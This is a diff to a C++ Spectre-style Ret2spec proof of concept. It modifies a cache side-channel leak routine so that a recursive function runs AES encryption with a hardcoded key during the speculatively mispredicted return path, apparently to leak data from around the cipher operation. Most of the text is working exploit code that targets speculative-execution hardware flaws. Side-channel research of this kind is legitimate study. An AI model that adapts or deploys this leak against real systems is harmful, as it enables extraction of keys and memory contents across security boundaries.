@@ -29,6 +29,10 @@ void (*return_false_base_case)();
 size_t current_offset;
 const std::array<BigByte, 256> *oracle_ptr;
 
+unsigned char key[16] = "0123456789abcde"; // AES key (128 bits)
+unsigned char plaintext[16] = "Hello, World!!"; // Note: must be 16 bytes for AES-128
+unsigned char ciphertext[16]; // To store the ciphertext
+
 // Return value of ReturnsFalse that never changes. Avoiding compiler
 // optimizations with it.
 bool false_value = false;
@@ -84,31 +88,34 @@ static bool ReturnsTrue(int counter) {
   return true;
 }
 
-void handleErrors(void) {
-    abort();
+void encrypt(const unsigned char *key, const unsigned char *plaintext, unsigned char *ciphertext) {
+    AES_KEY encryptKey;
+    if (AES_set_encrypt_key(key, 128, &encryptKey) < 0) {
+        return;
+    }
+    AES_encrypt(plaintext, ciphertext, &encryptKey);
 }
 
-void aes_encrypt(const unsigned char *key, const unsigned char *plaintext, unsigned char *ciphertext) {
-    AES_KEY encryptKey;
-    
-    // Set encryption key
-    if (AES_set_encrypt_key(key, 128, &encryptKey) < 0) {
-        handleErrors();
-    }
-    
-    // Encrypt the plaintext
-    AES_encrypt(plaintext, ciphertext, &encryptKey);
+static bool ReturnsTrueAES(int counter) {
+  char stack_mark = 'a';
+  stack_mark_pointers.push_back(&stack_mark);
+
+  if (counter > 0) {
+    ReturnsTrueAES(counter - 1);
+  } else {
+    encrypt(key, plaintext, ciphertext);
+    return_false_base_case();
+  }
+
+  stack_mark_pointers.pop_back();
+  FlushFromDataCache(&stack_mark, stack_mark_pointers.back());
+  return true;
 }
 
 char Ret2specLeakByte() {
   CacheSideChannel sidechannel;
   oracle_ptr = &sidechannel.GetOracle();
   const std::array<BigByte, 256> &oracle = *oracle_ptr;
-
-  // Key and plaintext
-  unsigned char key[16] = "0123456789abcde"; // AES key (128 bits)
-  unsigned char plaintext[16] = "Hello, World!!"; // Note: must be 16 bytes for AES-128
-  unsigned char ciphertext[16]; // To store the ciphertext
 
   for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
@@ -117,7 +124,8 @@ char Ret2specLeakByte() {
     // from an empty vector and crash.
     char stack_mark = 'a';
     stack_mark_pointers.push_back(&stack_mark);
-    ReturnsTrue(kRecursionDepth);
+    // ReturnsTrue(kRecursionDepth);
+    ReturnsTrueAES(kRecursionDepth);
     stack_mark_pointers.pop_back();
 
     std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
